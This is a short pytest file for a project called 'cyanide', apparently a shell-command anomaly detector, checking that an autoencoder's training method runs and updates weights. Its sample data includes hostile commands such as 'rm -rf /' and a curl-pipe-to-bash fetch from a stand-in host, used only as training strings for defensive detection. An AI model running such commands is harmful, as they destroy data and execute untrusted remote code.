import pytest
import torch

from cyanide.ml.model import CommandAutoencoder

pytest.importorskip("torch")


def test_model_fit():
    """Test the new incremental training (fit) method."""
    model = CommandAutoencoder(input_dim=64, latent_dim=16)
    # Ensure weights are tracked
    initial_weights = model.encoder[0].weight.clone()

    commands = [
        "ls -la",
        "cd /tmp",
        "rm -rf /",
        "wget http://malicious.com/payload",
        "curl http://1.2.3.4/sh | bash",
    ]

    # Train for 2 epochs
    loss = model.fit(commands, epochs=2, batch_size=2)

    assert loss > 0
    # Weights should have changed after training
    assert not torch.equal(model.encoder[0].weight, initial_weights)
    assert model.training is False  # Should be back in eval mode
